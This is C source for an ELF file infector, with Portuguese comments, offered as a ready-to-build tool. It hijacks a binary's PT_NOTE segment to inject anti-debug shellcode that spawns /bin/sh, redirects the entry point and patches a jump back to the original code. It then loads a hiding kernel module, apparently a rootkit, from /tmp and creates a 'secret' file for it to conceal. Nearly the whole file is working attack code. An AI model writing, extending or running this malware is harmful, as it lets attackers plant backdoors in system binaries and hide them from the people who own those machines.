/* gcc -o infector_integrado infector_integrado.c -O2 -s
   Uso: ./infector_integrado /bin/ls /tmp/ls_soberano */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <elf.h>

unsigned char payload[] = {
    // Anti-Debug: PTRACE_TRACEME
    0x48, 0x31, 0xc0, 0x48, 0xc7, 0xc0, 0x65, 0x00, 0x00, 0x00,
    0x48, 0x31, 0xff, 0x48, 0x31, 0xf6, 0x48, 0x31, 0xd2, 0x0f, 0x05,
    0x48, 0x85, 0xc0, 0x78, 0x2c,  // Debugger detectado → aborta

    // Execve /bin/sh
    0x48, 0x31, 0xd2, 0x48, 0x31, 0xf6,
    0x48, 0xbb, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x2f, 0x73, 0x68,
    0x53, 0x48, 0x89, 0xe7, 0xb0, 0x3b, 0x0f, 0x05,

    // Jump Back (patchado em runtime)
    0x48, 0xb8, 0xde, 0xad, 0xbe, 0xef, 0xde, 0xad, 0xbe, 0xef,
    0xff, 0xe0
};

int main(int argc, char **argv) {
    if (argc < 3) {
        fprintf(stderr, "Uso: %s <original> <infectado>\n", argv[0]);
        return 1;
    }

    int fd = open(argv[1], O_RDONLY);
    if (fd < 0) { perror("open"); return 1; }

    struct stat st;
    fstat(fd, &st);
    size_t size = st.st_size;

    unsigned char *data = mmap(NULL, size + sizeof(payload) + 4096,
                               PROT_READ | PROT_WRITE, MAP_PRIVATE, fd, 0);
    close(fd);

    Elf64_Ehdr *ehdr = (Elf64_Ehdr *)data;
    uint64_t oep = ehdr->e_entry;

    Elf64_Phdr *phdr = (Elf64_Phdr *)(data + ehdr->e_phoff);
    int found = 0;
    for (int i = 0; i < ehdr->e_phnum; i++) {
        if (phdr[i].p_type == PT_NOTE) {
            phdr[i].p_type = PT_LOAD;
            phdr[i].p_flags = PF_R | PF_X;
            phdr[i].p_offset = size;
            phdr[i].p_vaddr = phdr[i].p_paddr = 0x400000 + size;
            phdr[i].p_filesz = phdr[i].p_memsz = sizeof(payload);

            uint64_t *jump = (uint64_t*)(payload + sizeof(payload) - 10);
            *jump = oep;

            ehdr->e_entry = phdr[i].p_vaddr;
            found = 1;
            break;
        }
    }

    if (!found) {
        printf("[-] PT_NOTE não encontrado.\n");
        munmap(data, size + sizeof(payload) + 4096);
        return 1;
    }

    int out = open(argv[2], O_WRONLY | O_CREAT | O_TRUNC, 0755);
    write(out, data, size);
    write(out, payload, sizeof(payload));
    close(out);

    munmap(data, size + sizeof(payload) + 4096);

    printf("[+] Infector Integrado PT_NOTE Blindado instalado com sucesso!\n");

    // Integração com LKM
    system("if [ ! -d /sys/module/soberano_hide ]; then insmod /tmp/soberano_hide.ko 2>/dev/null || true; fi");
    system("touch /tmp/arquivo_secreto_payload");

    printf("[+] LKM carregado + arquivo secreto criado (será escondido).\n");
    return 0;
}
